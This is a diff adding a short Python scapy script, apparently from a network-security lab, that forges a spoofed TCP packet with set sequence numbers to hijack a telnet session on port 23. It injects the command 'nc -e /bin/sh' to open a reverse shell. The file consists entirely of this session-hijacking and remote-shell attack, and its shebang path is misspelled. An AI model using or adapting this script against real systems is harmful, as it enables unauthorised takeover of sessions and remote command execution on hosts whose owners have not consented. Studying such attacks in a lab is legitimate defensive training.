@@ -1,0 +1,12 @@
+#!/user/bin/python
+import sys
+from scapy.all import *
+
+IPLayer = IP (src="10.10.10.200", dst = "10.10.10.197")
+TCPLayer = TCP (sport=41592, dport=23, flags="A", seq=3450226896, ack=2937995748)
+
+data = "\n nc -e /bin/sh 10.10.10.197 \n"
+
+pkt=IPLayer/TCPLayer/data
+ls(pkt)
+send(pkt,verbose=0)
